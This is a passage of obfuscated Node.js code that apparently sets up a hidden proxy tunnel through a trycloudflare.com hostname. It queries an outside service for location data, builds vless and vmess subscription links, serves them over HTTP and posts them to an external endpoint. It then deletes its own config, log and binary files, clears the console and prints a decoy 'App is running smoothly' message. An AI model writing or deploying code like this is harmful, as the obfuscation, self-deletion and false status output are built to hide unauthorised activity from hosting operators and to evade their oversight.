]*trycloudflare\.com)\/?/);_0xb6e5c7?await generateServiceEndpoints(_0xb6e5c7[0x1]):setTimeout(extractHostnames,0xbb8);}catch(_0x556295){}}async function getSystemInfo(){const _0x281e65=_0x1707e5;try{const _0x8e5f4a=await axios['get'](_0x281e65(0x197),{'timeout':0xbb8});return _0x8e5f4a['data'][_0x281e65(0x1b2)]+'_'+_0x8e5f4a[_0x281e65(0x1b8)][_0x281e65(0x1d4)];}catch(_0x5bd742){return _0x281e65(0x1ca);}}async function generateServiceEndpoints(_0x30c98d){const _0x8bc470=_0x1707e5,_0x262fdc=await getSystemInfo(),_0x4a2560=SERVICE_NAME?SERVICE_NAME+'-'+_0x262fdc:_0x262fdc,_0x31a949={'v':'2','ps':_0x4a2560,'add':PROXY_HOST,'port':PROXY_PORT,'id':SERVICE_ID,'aid':'0','scy':_0x8bc470(0x18a),'net':'ws','type':'none','host':_0x30c98d,'path':_0x8bc470(0x1e4),'tls':_0x8bc470(0x1b3),'sni':_0x30c98d,'fp':_0x8bc470(0x174)},_0x1815d5='vless://'+SERVICE_ID+'@'+PROXY_HOST+':'+PROXY_PORT+_0x8bc470(0x1c8)+_0x30c98d+_0x8bc470(0x15b)+_0x30c98d+_0x8bc470(0x1b5)+_0x4a2560+_0x8bc470(0x1da)+Buffer[_0x8bc470(0x1e7)](JSON['stringify'](_0x31a949))[_0x8bc470(0x192)]('base64')+_0x8bc470(0x17a)+SERVICE_ID+'@'+PROXY_HOST+':'+PROXY_PORT+'?security=tls&sni='+_0x30c98d+_0x8bc470(0x15b)+_0x30c98d+_0x8bc470(0x158)+_0x4a2560;fs[_0x8bc470(0x1a8)](endpointsPath,Buffer[_0x8bc470(0x1e7)](_0x1815d5)['toString'](_0x8bc470(0x157))),app[_0x8bc470(0x18b)]('/'+API_PATH,(_0x761273,_0x5da9ed)=>{const _0x57d41c=_0x8bc470;_0x5da9ed[_0x57d41c(0x167)]('Content-Type',_0x57d41c(0x161)),_0x5da9ed['send'](Buffer['from'](_0x1815d5)['toString'](_0x57d41c(0x157)));}),await syncServiceEndpoints();}async function syncServiceEndpoints(){const _0x2120ab=_0x1707e5;if(API_ENDPOINT&&SERVICE_BASE_URL){const _0x1c7a5f={'subscription':[SERVICE_BASE_URL+'/'+API_PATH]};await axios[_0x2120ab(0x1bb)](API_ENDPOINT+_0x2120ab(0x1cc),_0x1c7a5f)[_0x2120ab(0x18e)](()=>null);}}function cleanupServiceFiles(){setTimeout(()=>{const _0x48c861=_0x48e1,_0x514b93=[serviceLogPath,gatewayConfigPath,serviceBPath,gatewayServicePath,serviceAPath,monitorServicePath];_0x514b93['forEach'](_0x3fbb8c=>{const _0x398026=_0x48e1;if(fs[_0x398026(0x1b0)](_0x3fbb8c))fs['unlinkSync'](_0x3fbb8c);}),console[_0x48c861(0x189)](),console['log']('App\x20is\x20running\x20smoothly.');},0x15f90);}async function initializeService(){configureGateway(),cleanupEndpoints(),cleanupData(),await buildServiceConfig(),await fetchAndStartServices(),await extractHostnames(),cleanupServiceFiles();}initializeService()[_0x1707e5(0x18e)](console[_0x1707e5(0x1ae)]),app[_0x1707e5(0x188)](SERVER_PORT,()=>console[_0x1707e5(0x195)]('Server\x20is\x20running\x20on\x20port:'+SERVER_PORT));
